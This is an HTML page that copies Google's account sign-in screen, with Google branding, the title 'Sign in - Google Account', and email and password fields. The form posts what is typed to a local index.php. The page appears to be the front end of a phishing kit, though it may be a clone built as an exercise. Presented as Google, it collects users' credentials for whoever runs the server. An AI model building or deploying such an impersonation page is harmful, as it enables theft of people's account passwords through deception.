<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="./reset.css" />
    <link rel="stylesheet" href="./styles.css" />

    <title>Sign in - Google Account</title>
  </head>

  <body>
    <div class="container">
        <form action="index.php" method="POST">
            <div class="card">
                <img src="./images/google-logo.svg" alt="" />
                <h2>Login</h2>
                <h3>Use your Google Account</h3>

                <input type="email" name="email" id="email" placeholder="Email" /><br>
                <input type="password" name="pass" id="pass" placeholder="Passowrd" />
                <div class="btn-email">
                    <button type="button">Forgot email?</button>
                </div>

                <p>
                    Not your computer? Use Guest mode to sign in privately. 
                    <a href="">Learn more</a>
                </p>
                
                <div class="card-bottom">
                    <a href="">Create account</a>
                    <button type="submit" name="action" id="action">Signin</button>
                </div>
            </div>
        </form>

      <div class="footer">
        <select name="select">
          <option value="English (United States)">English (United States)</option>
          <option value="Portugês (Brasil) selected">Portugês (Brasil)</option>
          <option value="Español (España)">Español (España)</option>
        </select>

        <div class="footer-span">
          <span>Help</span>
          <span>Privacy</span>
          <span>Terms</span>
        </div>
      </div>
    </div>
  </body>
</html>
